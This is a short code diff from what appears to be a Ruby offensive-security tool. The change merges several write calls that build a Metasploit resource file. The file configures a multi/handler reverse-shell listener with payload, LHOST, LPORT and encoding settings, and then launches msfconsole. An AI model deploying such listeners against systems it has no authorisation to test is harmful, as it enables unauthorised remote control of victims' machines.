@@ -113,13 +113,7 @@ def metasploit_setup(msf_path, host, port)
   print_info("Setting up Metasploit this may take a moment\n")
   rc_file = 'msf_listener.rc'
   file = File.open("#{rc_file}", 'w')
-  file.write("use exploit/multi/handler\n")
-  file.write("set PAYLOAD #{@set_payload}\n")
-  file.write("set LHOST #{host}\n")
-  file.write("set LPORT #{port}\n")
-  file.write("set EnableStageEncoding true\n")
-  file.write("set ExitOnSession false\n")
-  file.write('exploit -j')
+  file.write("use exploit/multi/handler\nset PAYLOAD #{@set_payload}\nset LHOST #{host}\nset LPORT #{port}\nset EnableStageEncoding true\nset ExitOnSession false\nexploit -j")
   file.close
   system("#{msf_path}./msfconsole -r #{rc_file}")
 end
